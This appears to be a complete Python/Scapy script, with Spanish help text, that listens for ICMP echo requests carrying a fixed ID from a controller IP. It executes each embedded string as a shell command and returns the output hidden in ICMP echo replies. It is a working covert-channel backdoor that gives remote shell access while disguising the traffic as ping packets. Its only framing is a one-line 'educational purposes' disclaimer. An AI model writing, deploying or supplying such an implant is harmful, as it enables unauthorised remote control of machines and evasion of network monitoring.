from scapy.all import *
import time
import subprocess
import argparse

interfaces = get_if_list()
for i in interfaces:
    if i == "lo":
        continue
    else:
        interfaz_activa = i



parser = argparse.ArgumentParser(description="Esta es una herramienta que permite ejecutar comandos en remoto a traves del protocolo icmp, solo con fines educativos.",epilog="Ejemplo: sudo python3 icmp_client.py -t <IP target> -i <interfaz>",add_help=False)
parser.add_argument("-h","--help" ,help="Ayuda (Este menu)",action="store_true")
parser.add_argument("-t","--target" ,help="IP del objetivo")

parser.add_argument("-i","--iface",default=interfaz_activa,help=f"Interfaz a usar, default {interfaz_activa}")

args = parser.parse_args()

if args.help or not args.target:
    parser.print_help()
    sys.exit()


conf.verb = 0
id_icmp = 7777
ip_cac = args.target

def sniffer(paquete):
	if paquete[ICMP].id == id_icmp and paquete[IP].src == ip_cac and paquete[ICMP].type == 8:
		comando = paquete[Raw].load.decode("utf-8")
		if comando == "exit":
			raise KeyboardInterrupt
		else:
			try:
				salida=subprocess.check_output(comando,shell=True).decode("utf-8")
				paquete_out = IP(dst=ip_cac, ttl=64)/ICMP(type=0,code=0,id=id_icmp)/ salida
				send(paquete_out)
			except:
				paquete_out_error=IP(dst=ip_cac, ttl=64)/ICMP(type=0,code=0,id=id_icmp)/ "Error de sintaxis o salida muy grande, chequea el comando"
				send(paquete_out_error)
sniff(iface=args.iface,filter="icmp", prn=sniffer, store=0)
